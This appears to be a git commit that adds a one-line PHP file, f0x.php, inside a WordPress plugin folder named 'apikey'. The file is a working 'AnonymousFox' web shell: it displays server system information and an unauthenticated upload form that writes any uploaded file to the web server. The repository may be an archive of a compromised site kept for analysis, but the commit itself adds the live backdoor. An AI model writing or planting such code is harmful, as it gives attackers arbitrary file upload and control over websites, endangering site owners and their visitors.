1e14f2aa0cde267bc171e44d228079323a42d3a7
Stefan Pejcic <pejcha1994@gmail.com>
2021-02-01 12:39:49 +0100

    Create f0x.php

---
+++ 01.02.2021/wp-content/plugins/apikey/f0x.php
@@ -0,0 +1,1 @@
+<?php echo "AnonymousFox"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>
